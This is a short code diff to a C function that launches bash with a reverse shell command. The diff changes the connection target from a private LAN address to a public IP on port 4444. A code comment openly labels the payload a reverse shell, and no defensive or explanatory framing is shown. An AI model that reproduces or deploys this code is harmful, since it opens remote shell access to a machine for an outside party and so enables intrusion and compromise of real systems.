@@ -14,7 +14,7 @@ void func(char *input) {
   int status;
   pid_t ret;
   // Command to execute bash with the reverse shell command using bash -c
-  char *const args[4] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.0.84/4444 0>&1", NULL};
+  char *const args[4] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/35.202.125.194/4444 0>&1", NULL};
   char **env;
   extern char **environ;
 
